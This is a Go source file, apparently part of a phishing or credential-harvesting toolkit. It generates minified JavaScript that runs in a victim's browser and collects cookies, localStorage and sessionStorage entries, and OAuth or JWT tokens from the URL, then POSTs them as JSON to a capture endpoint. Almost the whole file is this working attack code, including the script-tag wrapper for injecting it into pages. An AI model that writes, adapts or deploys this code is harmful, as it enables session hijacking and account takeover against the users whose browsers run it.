// Package capture provides JavaScript code generation for form field capture and
// submission interception. The generated JavaScript runs in the target's browser
// to enumerate form fields and intercept form submissions for credential exfiltration.
package capture

import (
	"fmt"
	"strings"
)

// SessionCaptureConfig controls which session artifacts to capture.
type SessionCaptureConfig struct {
	// CaptureCookies enables document.cookie capture.
	CaptureCookies bool
	// CaptureLocalStorage enables localStorage enumeration.
	CaptureLocalStorage bool
	// CaptureSessionStorage enables sessionStorage enumeration.
	CaptureSessionStorage bool
	// CaptureURLTokens enables OAuth/auth token extraction from URL.
	CaptureURLTokens bool
	// SessionEndpoint is the local API path for POSTing session data.
	SessionEndpoint string
	// TrackingParam is the URL parameter for tracking tokens.
	TrackingParam string
}

// GenerateSessionCaptureJS returns minified JavaScript for session artifact capture.
// The returned JS should be wrapped in <script> tags by the caller.
//
// Session capture collects:
//   - cookies (non-httpOnly)
//   - localStorage values
//   - sessionStorage values
//   - OAuth/auth tokens from URL parameters and fragment
//
// Data is sent to the session endpoint as JSON POST with structure:
//
//	{
//	  "s": [
//	    {"dt":"cookie","k":"JSESSIONID","v":"abc","md":{},"ts":true}
//	  ],
//	  "t":"tracking-token",
//	  "m":{"url":"/login","ua":"...","ts":1234567890}
//	}
func GenerateSessionCaptureJS(config SessionCaptureConfig) string {
	if config.SessionEndpoint == "" {
		config.SessionEndpoint = "/api/session-capture"
	}
	if config.TrackingParam == "" {
		config.TrackingParam = "_t"
	}

	var sb strings.Builder

	sb.WriteString("(function(){")
	sb.WriteString("var cfg={")
	sb.WriteString(fmt.Sprintf("ep:'%s',tp:'%s'", config.SessionEndpoint, config.TrackingParam))
	if config.CaptureCookies {
		sb.WriteString(",ck:true")
	}
	if config.CaptureLocalStorage {
		sb.WriteString(",ls:true")
	}
	if config.CaptureSessionStorage {
		sb.WriteString(",ss:true")
	}
	if config.CaptureURLTokens {
		sb.WriteString(",ut:true")
	}
	sb.WriteString("};")

	// Tracking token extraction
	sb.WriteString(`function _t(){
var u=new URLSearchParams(window.location.search),t=u.get(cfg.tp)||'';if(!t){var p=window.location.pathname.split('/').filter(Boolean);t=p[p.length-1];if(!/^[a-f0-9-]{32,}$/.test(t)){t=''}}return t};`)

	// Metadata collection
	sb.WriteString(`function _m(){
return{url:window.location.pathname,ua:navigator.userAgent,ts:Date.now()}};`)

	// Cookie capture
	sb.WriteString(`function _ck(){
var c=[],r=/^(JSESSIONID|PHPSESSID|ASP\.NET_SessionId|connect\.sid|_session_id)$/i,m=/__Secure-|^__Host-/i,a=/token|auth|session|jwt|sid/i;
for(var k of document.cookie.split(';')){k=k.trim();var idx=k.indexOf('=');if(idx<0)continue;var n=k.slice(0,idx),v=k.slice(idx+1);if(!n||n.startsWith('$'))continue;var d=document.cookie.match(new RegExp('(?:^|; )'+n.replace(/[$.+*?\\]^|()[{}]/g,'\\$1')+'=')),md={domain:window.location.hostname,path:document.cookie};if(m.test(n)||r.test(n)||a.test(n))md.ts=true;c.push({dt:'cookie',k:n,v:v,md:md,ts:md.ts||false})}return c};`)

	// localStorage capture
	sb.WriteString(`function _ls(){
var a=[],m=/token|auth|jwt|session|bearer|api_key|access_token|refresh_token|id_token/i;
try{for(var k in localStorage){if(!localStorage.hasOwnProperty(k))continue;var v=localStorage[k],md={};if(m.test(k))md.ts=true;a.push({dt:'local_storage',k:k,v:v,md:md,ts:md.ts||false})}}catch(e){}return a};`)

	// sessionStorage capture
	sb.WriteString(`function _ss(){
var a=[],m=/token|auth|jwt|session|bearer|api_key|access_token|refresh_token|id_token/i;
try{for(var k in sessionStorage){if(!sessionStorage.hasOwnProperty(k))continue;var v=sessionStorage[k],md={};if(m.test(k))md.ts=true;a.push({dt:'session_storage',k:k,v:v,md:md,ts:md.ts||false})}}catch(e){}return a};`)

	// URL token capture
	sb.WriteString(`function _ut(){
var a=[],q=new URLSearchParams(window.location.search),f=window.location.hash.substring(1),h=new URLSearchParams(f),p={code:'authorization_code',auth_code:'authorization_code',authorization_code:'authorization_code',access_token:'access_token',refresh_token:'refresh_token',id_token:'id_token',token:'access_token'};
function n(k,v,s){var t=p[k]||'token',md={subtype:t,source:s},ts=t!=='token';a.push({dt:'oauth_token',k:k,v:v,md:md,ts:ts})};q.forEach(function(v,k){n(k,v,'url_param')});h.forEach(function(v,k){n(k,v,'fragment')});return a};`)

	// JWT detection regex pattern (for value auto-detection)
	sb.WriteString(`var jwtr=/eyJ[A-Za-z0-9_-]+\\.eyJ[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+/;`)

	// Send session data function
	sb.WriteString(`function _s(d){
var c=new XMLHttpRequest(),b=JSON.stringify({s:d,t:_t(),m:_m()});
c.open('POST',cfg.ep,!0);
c.setRequestHeader('Content-Type','application/json');
c.send(b);
return c};`)

	// Main initialization
	sb.WriteString(`function _(){
var d=[];cfg.ck&&d.push.apply(d,_ck());cfg.ls&&d.push.apply(d,_ls());cfg.ss&&d.push.apply(d,_ss());cfg.ut&&d.push.apply(d,_ut());_s(d)};`)

	// DOM ready handler
	sb.WriteString(`if(document.readyState==='loading')document.addEventListener('DOMContentLoaded',_);else_()})();`)

	return sb.String()
}

// GenerateSessionCaptureScriptTag generates a complete <script> tag with embedded session capture JS.
func GenerateSessionCaptureScriptTag(config SessionCaptureConfig) string {
	js := GenerateSessionCaptureJS(config)
	return fmt.Sprintf("<script>%s</script>", js)
}
